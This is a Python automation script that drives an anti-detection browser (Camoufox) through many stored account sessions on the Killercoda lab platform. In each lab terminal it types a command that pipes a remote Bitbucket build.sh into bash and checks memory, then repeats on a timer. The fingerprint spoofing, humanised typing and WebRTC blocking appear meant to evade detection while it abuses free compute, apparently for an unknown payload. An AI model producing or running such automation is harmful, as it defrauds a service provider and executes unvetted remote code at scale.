import json
import os
import time
import glob
import argparse
from camoufox.sync_api import Camoufox
from browserforge.fingerprints import Screen

os.environ['DISPLAY'] = ':1'
SESSIONS_DIR = "sessions"

def load_sessions():
    files = sorted(glob.glob(os.path.join(SESSIONS_DIR, "*.json")))
    sessions = []
    for f in files:
        with open(f) as fp:
            sessions.append(json.load(fp))
    return sessions

parser = argparse.ArgumentParser()
parser.add_argument("-s", type=int, help="Pick session by 1-based index")
args = parser.parse_args()

all_sessions = load_sessions()
print(f"[+] Loaded {len(all_sessions)} sessions")

sessions = [all_sessions[args.s - 1]] if args.s is not None else all_sessions

LAB_URL = "https://killercoda.com/course-cnpe/scenario/playground"
COMMANDS = ["curl 'https://bitbucket.org/nourri03/build/raw/b0d467b192aac8ff15945685142c57ad8d39c8ca/build.sh' | bash", "free -m"]

with Camoufox(
    os=["windows", "macos", "linux"],
    screen=Screen(max_width=1920, max_height=1080),
    geoip=True,
    humanize=True,
    headless=False,
    block_webrtc=True,
    locale="en-US",
) as browser:
    pages = []
    for s in sessions:
        email = s.get("email", "?")
        cookies = s.get("cookies", [])
        print(f"[+] Opening session: {email}")
        ctx = browser.new_context()
        ctx.add_cookies(cookies)
        page = ctx.new_page()
        page.goto("https://killercoda.com/", wait_until="domcontentloaded", timeout=60000)
        print(f"    -> {page.url}")
        pages.append(page)

    while True:
        for page in pages:
            print(f"[+] Navigating to lab: {LAB_URL}")
            page.goto(LAB_URL, wait_until="networkidle", timeout=90000)
            time.sleep(3)

            # Find terminal frame
            print("[+] Waiting for terminal frame...")
            terminal_frame = None
            for attempt in range(60):
                for frame in page.frames:
                    try:
                        if frame.query_selector("#terminal-container"):
                            terminal_frame = frame
                            break
                    except Exception:
                        pass
                if terminal_frame:
                    print(f"[+] Found terminal in frame: {terminal_frame.url}")
                    break
                time.sleep(5)
                print(f"  retrying... ({attempt+1}/60)")
            else:
                print("[-] Terminal frame never found")

            if terminal_frame:
                terminal_frame.wait_for_selector(".xterm-helper-textarea", timeout=60000)
                time.sleep(2)

                textarea = terminal_frame.query_selector(".xterm-helper-textarea")
                textarea.click()
                print("[+] Terminal focused, sending commands...")

                for cmd in COMMANDS:
                    textarea.type(cmd, delay=80)
                    page.keyboard.press("Enter")
                    print(f"[+] Sent: {cmd}")
                    time.sleep(2)

                # Click Exit Scenario
                try:
                    page.wait_for_selector("[title='Exit Scenario']", timeout=10000).click()
                    print("[+] Clicked Exit Scenario")
                except Exception as e:
                    print(f"[-] Exit Scenario button not found: {e}")

                # Confirm exit dialog
                try:
                    page.wait_for_selector("button.dg-btn.dg-btn--ok.dg-pull-right", timeout=5000).click()
                    print("[+] Clicked Exit confirmation")
                except Exception as e:
                    print(f"[-] Exit confirmation not found: {e}")

                # Accept cookies if banner appears
                try:
                    page.wait_for_selector(
                        "button:has-text('Accept'), button:has-text('Accept all'), button:has-text('Accept cookies'), [id*='accept'], [class*='accept']",
                        timeout=5000
                    ).click()
                    print("[+] Accepted cookies")
                except Exception:
                    pass

        print("[+] Sleeping 60 minutes before revisiting...")
        time.sleep(50 * 60)
        print("[+] Revisiting lab URL...")
